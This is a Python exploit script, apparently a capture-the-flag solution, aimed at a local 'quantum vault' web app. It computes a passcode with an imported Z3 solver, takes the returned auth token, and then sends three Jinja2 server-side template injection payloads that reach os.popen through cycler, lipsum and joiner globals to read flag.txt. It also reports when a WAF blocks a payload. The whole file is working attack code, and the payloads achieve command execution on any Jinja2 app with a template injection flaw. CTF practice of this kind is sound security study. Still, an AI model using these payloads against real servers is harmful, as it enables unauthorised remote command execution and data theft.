import os
import requests

def exploit_quantum_vault(base_url="http://127.0.0.1:8088", cmd="type flag.txt"):
    # Step 1: Solve Z3 SMT constraint to obtain valid 16-byte passcode
    import sys
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from solve_z3_passcode import solve_quantum_passcode

    passcode = solve_quantum_passcode()
    print(f"[*] Step 1: Submitting Z3 Passcode '{passcode}' to unlock stage 1...")

    res1 = requests.post(f"{base_url}/api/vault/unlock", json={"passcode": passcode}, timeout=5)
    data1 = res1.json()
    if not data1.get("success"):
        print(f"[-] Unlock failed: {data1}")
        return None

    auth_token = data1.get("auth_token")
    print(f"[+] Stage 1 Unlocked! Auth Token: {auth_token}")

    # Step 2: Test SSTI payloads based on hardness mode
    # Cross-platform command reading flag.txt
    cmd_to_run = "type flag.txt" if os.name == "nt" else "cat flag.txt"

    payloads = [
        # Standard unconstrained SSTI
        f"{{{{ cycler.__init__.__globals__.os.popen('{cmd_to_run}').read() }}}}",
        # Lipsum variant
        f"{{{{ lipsum.__globals__['os'].popen('{cmd_to_run}').read() }}}}",
        # Builtin helper
        f"{{{{ joiner.__init__.__globals__.os.popen('{cmd_to_run}').read() }}}}"
    ]

    for p in payloads:
        print(f"[*] Testing SSTI payload: {p[:50]}...")
        res2 = requests.post(f"{base_url}/api/vault/audit", json={
            "auth_token": auth_token,
            "signature": p
        }, timeout=5)

        data2 = res2.json()
        if data2.get("status") == "success":
            flag_output = data2.get("rendered_signature", "").strip()
            print(f"[🎉 EXPLOIT SUCCESSFUL] Flag Extracted:\n{flag_output}")
            return flag_output
        elif data2.get("status") == "blocked":
            print(f"[!] WAF Filter Blocked payload: {data2.get('waf_alert')}")

    return None

if __name__ == "__main__":
    exploit_quantum_vault()
